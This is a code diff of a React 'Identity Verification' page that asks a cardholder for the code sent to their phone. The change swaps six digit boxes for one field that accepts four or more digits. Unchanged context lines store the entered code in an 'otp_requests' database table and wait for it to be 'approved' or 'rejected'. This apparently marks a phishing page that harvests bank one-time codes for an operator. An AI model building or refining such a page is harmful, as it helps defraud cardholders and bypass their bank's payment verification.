@@ -5,7 +5,7 @@ import { useLanguage } from "@/i18n/LanguageContext";
 import { useToast } from "@/hooks/use-toast";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
-import { ShieldCheck, Lock, RefreshCw } from "lucide-react";
+import { ShieldCheck, Lock, RefreshCw, CreditCard } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import { playChime } from "@/hooks/use-action-sound";
 
@@ -28,12 +28,12 @@ const CardOTP = () => {
     orderId?: string;
   } | null;
 
-  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [otpCode, setOtpCode] = useState("");
   const [status, setStatus] = useState<"idle" | "waiting" | "approved" | "rejected">("idle");
   const [otpRequestId, setOtpRequestId] = useState<string | null>(null);
   const [shake, setShake] = useState(false);
   const [resendTimer, setResendTimer] = useState(0);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const inputRef = useRef<HTMLInputElement | null>(null);
 
   // عداد إعادة الإرسال
   useEffect(() => {
@@ -89,34 +89,9 @@ const CardOTP = () => {
     return () => { supabase.removeChannel(channel); };
   }, [otpRequestId]);
 
-  const handleOtpChange = (index: number, value: string) => {
-    const digit = value.replace(/\D/g, "").slice(-1);
-    const newOtp = [...otp];
-    newOtp[index] = digit;
-    setOtp(newOtp);
-    if (digit && index < 5) {
-      inputRefs.current[index + 1]?.focus();
-    }
-  };
-
-  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
-    if (e.key === "Backspace" && !otp[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    }
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    e.preventDefault();
-    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
-    const newOtp = [...otp];
-    pasted.split("").forEach((d, i) => { if (i < 6) newOtp[i] = d; });
-    setOtp(newOtp);
-    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
-  };
-
   const submitOtp = async () => {
-    const code = otp.join("");
-    if (code.length < 6) {
+    const code = otpCode.trim();
+    if (code.length < 4) {
       setShake(true);
       setTimeout(() => setShake(false), 600);
       playChime("error");
@@ -130,7 +105,6 @@ const CardOTP = () => {
     setStatus("waiting");
     playChime("notification");
 
-    // حفظ OTP في قاعدة البيانات
     const { data, error } = await (supabase as any)
       .from("otp_requests")
       .insert({
@@ -155,10 +129,10 @@ const CardOTP = () => {
   };
 
   const resendOtp = () => {
-    setOtp(["", "", "", "", "", ""]);
+    setOtpCode("");
     setStatus("idle");
     setOtpRequestId(null);
-    inputRefs.current[0]?.focus();
+    inputRef.current?.focus();
     toast({
       title: isAr ? "تم إعادة التعيين" : "Reset done",
       description: isAr ? "أدخل الرمز الجديد" : "Enter the new code",
@@ -188,13 +162,18 @@ const CardOTP = () => {
             <h1 className="font-display text-2xl font-bold text-foreground mb-2">
               {isAr ? "التحقق من الهوية" : "Identity Verification"}
             </h1>
-            <p className="text-sm text-muted-foreground mb-2">
+            <p className="text-sm text-muted-foreground mb-3">
               {isAr ? "أدخل رمز التحقق المرسل إلى جوالك" : "Enter the verification code sent to your phone"}
             </p>
+
+            {/* آخر 4 أرقام من البطاقة */}
             {state?.cardLast4 && (
-              <p className="text-xs text-muted-foreground mb-6 font-mono" dir="ltr">
-                •••• •••• •••• {state.cardLast4}
-              </p>
+              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-muted/50 border border-border mb-6" dir="ltr">
+                <CreditCard className="w-4 h-4 text-muted-foreground" />
+                <span className="text-sm text-muted-foreground font-mono tracking-widest">
+                  •••• {state.cardLast4}
+                </span>
+              </div>
             )}
 
             <AnimatePresence mode="wait">
@@ -245,31 +224,27 @@ const CardOTP = () => {
 
               {(status === "idle" || status === "waiting") && (
                 <motion.div key="input" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
-                  {/* حقول OTP */}
+                  {/* حقل OTP واحد */}
                   <motion.div
-                    className="flex justify-center gap-2 mb-6"
+                    className="mb-6"
                     animate={shake ? { x: [0, -10, 10, -8, 8, -4, 4, 0] } : { x: 0 }}
                     transition={{ duration: 0.5 }}
-                    dir="ltr"
                   >
-                    {otp.map((digit, i) => (
-                      <input
-                        key={i}
-                        ref={el => { inputRefs.current[i] = el; }}
-                        type="text"
-                        inputMode="numeric"
-                        maxLength={1}
-                        value={digit}
-                        onChange={e => handleOtpChange(i, e.target.value)}
-                        onKeyDown={e => handleKeyDown(i, e)}
-                        onPaste={handlePaste}
-                        disabled={status === "waiting"}
-                        className={`w-11 h-14 text-center text-xl font-bold rounded-xl border-2 bg-background transition-all outline-none
-                          ${digit ? "border-primary text-primary" : "border-border text-foreground"}
-                          ${status === "waiting" ? "opacity-60 cursor-not-allowed" : "focus:border-primary focus:ring-2 focus:ring-primary/20"}
-                        `}
-                      />
-                    ))}
+                    <input
+                      ref={inputRef}
+                      type="text"
+                      inputMode="numeric"
+                      value={otpCode}
+                      onChange={e => setOtpCode(e.target.value.replace(/\D/g, ""))}
+                      disabled={status === "waiting"}
+                      placeholder={isAr ? "أدخل رمز التحقق" : "Enter verification code"}
+                      className={`w-full h-14 text-center text-2xl font-bold font-mono tracking-[0.3em] rounded-xl border-2 bg-background transition-all outline-none
+                        ${otpCode ? "border-primary text-primary" : "border-border text-foreground"}
+                        ${status === "waiting" ? "opacity-60 cursor-not-allowed" : "focus:border-primary focus:ring-2 focus:ring-primary/20"}
+                      `}
+                      dir="ltr"
+                      autoFocus
+                    />
                   </motion.div>
 
                   {/* حالة الانتظار */}
@@ -302,7 +277,7 @@ const CardOTP = () => {
                   {status === "idle" && (
                     <button
                       onClick={submitOtp}
-                      disabled={otp.join("").length < 6}
+                      disabled={otpCode.length < 4}
                       className="w-full h-12 rounded-xl bg-primary text-primary-foreground font-semibold text-base hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                     >
                       <ShieldCheck className="w-4 h-4" />
